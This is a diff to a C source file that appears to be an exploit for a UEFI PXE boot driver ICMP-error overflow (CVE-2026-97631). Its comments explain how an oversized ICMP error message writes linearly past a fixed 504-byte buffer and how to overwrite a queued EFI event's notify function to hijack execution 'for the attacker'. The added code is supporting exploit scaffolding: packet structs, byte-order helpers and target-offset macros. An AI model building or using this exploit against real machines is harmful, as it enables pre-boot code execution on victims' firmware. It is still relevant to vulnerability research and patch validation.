@@ -3,23 +3,32 @@
  * CVE-2026-97631  /  GHSA-99cj-7hg9-mp4m
  * NetworkPkg/UefiPxeBcDxe.c : PxeBcIcmpErrorDpcHandle(), PxeBcIcmp6ErrorDpcHandle()
  *
- * The driver keeps a Udp4/Udp6 receive token armed for the whole PXE session and
- * copies every delivered ICMP error message into a fixed 504-byte struct:
+ * During PXE boot the driver keeps a Udp4/Udp6 receive token armed and copies
+ * every delivered ICMP error message into a fixed 504-byte member:
  *
  *   typedef struct {
  *     UINT8  Type; UINT8 Code; UINT16 Checksum;
  *     union { ... UINT8 Data[494]; } u;
  *   } EFI_PXE_BASE_CODE_ICMP_ERROR;          // sizeof == 504
  *
- * The copy loop bounds check counts the 4-byte ICMP header twice (CWE-131), so
- * the effective limit is 508 and, more importantly, it is computed from the
- * *IP payload length* rather than the validated ICMP message length. Any ICMP
- * error message longer than 504 bytes therefore becomes a linear write past
- * &Mode->IcmpError, in the same pool page as EFI_PXE_BASE_CODE_MODE and the
- * neighbouring PXEBC_PRIVATE_DATA allocations.
+ * The copy is bounded against a length that is not the validated ICMP message
+ * length (CWE-131), so a longer error message becomes a linear write past
+ * &Mode->IcmpError, into whatever the pool allocator placed next.
  *
- * Key consequence for the attacker: the destination of the write is the address
- * of the receive copy itself, i.e.
+ * VERIFY THIS against the target's own source before trusting the numbers
+ * below: the advisory describes the flawed bound but does not give the exact
+ * expression, and the fix (#13302) changes it. Read the two DpcHandle
+ * functions in the tree you are testing and confirm what the count is derived
+ * from. Everything in this file that depends on it is marked.
+ *
+ * The corruption is deterministic in direction: any error message longer than
+ * 504 bytes writes forward, linearly, with a fixed byte-for-byte mapping from
+ * datagram offset to destination offset. That is what makes the primitive
+ * usable without a leak - but it also means an oversized message always
+ * damages whatever sits after the buffer, so the payload has to put that back.
+ *
+ * Key consequence for the attacker: the destination of the write is the
+ * address of the receive copy itself, i.e.
  *
  *      packet offset i   ->   &Mode->IcmpError + i
  *
@@ -34,6 +43,28 @@
 
 #include <stdint.h>
 #include <stddef.h>
+
+#if defined(_WIN32)
+/* Byte-order helpers.  Deliberately not named htons/htonl: <winsock.h> is
+ * pulled in by <windows.h> and would clash. */
+static inline uint16_t pxe_htons(uint16_t v)
+{
+  return (uint16_t)((v >> 8) | (v << 8));
+}
+static inline uint16_t pxe_ntohs(uint16_t v) { return pxe_htons(v); }
+static inline uint32_t pxe_htonl(uint32_t v)
+{
+  return ((v & 0xff000000u) >> 24) | ((v & 0x00ff0000u) >> 8) |
+         ((v & 0x0000ff00u) << 8)  | ((v & 0x000000ffu) << 24);
+}
+static inline uint32_t pxe_ntohl(uint32_t v) { return pxe_htonl(v); }
+#else
+#include <arpa/inet.h>
+static inline uint16_t pxe_htons(uint16_t v) { return htons(v); }
+static inline uint16_t pxe_ntohs(uint16_t v) { return ntohs(v); }
+static inline uint32_t pxe_htonl(uint32_t v) { return htonl(v); }
+static inline uint32_t pxe_ntohl(uint32_t v) { return ntohl(v); }
+#endif
 
 #define PXE_ICMP_ERROR_SIZE   504u   /* sizeof(EFI_PXE_BASE_CODE_ICMP_ERROR) */
 #define PXE_ICMP_HDR_SIZE     8u
@@ -57,7 +88,11 @@
 /* Distance from &Mode->IcmpError to the EFI_EVENT we hand to CoreSignalEvent().
  * The advisory describes this as "plant a counterfeit event in the same packet";
  * in practice you corrupt an already-queued event's NotifyFunction/NotifyTpl
- * (or the LIST_ENTRY that CoreSignalEvent walks into it). */
+ * (or the LIST_ENTRY that CoreSignalEvent walks into it).
+ *
+ * 504 is only the first byte the overflow can touch. The real offset depends on
+ * what the allocator put after Mode, and is measured per build with
+ * tools/fw_offsets.py. */
 #ifndef GRAFT_EVENT_OFF
 #define GRAFT_EVENT_OFF       504u
 #endif
@@ -131,6 +166,21 @@ typedef struct {
 } icmp6_err_hdr_t;
 
 #pragma pack(pop)
+
+/* IPv6 header, RFC 8200 section 3. */
+#pragma pack(push, 1)
+typedef struct {
+  uint32_t ver_tc_flow;
+  uint16_t payload_len;
+  uint8_t  next_hdr;
+  uint8_t  hop_limit;
+  uint8_t  src[16];
+  uint8_t  dst[16];
+} ip6_hdr_t;
+#pragma pack(pop)
+
+#define IP6_HDR_LEN 40u
+#define IPPROTO_ICMPV6_N 58u
 
 static inline uint32_t csum_fold(uint32_t sum)
 {
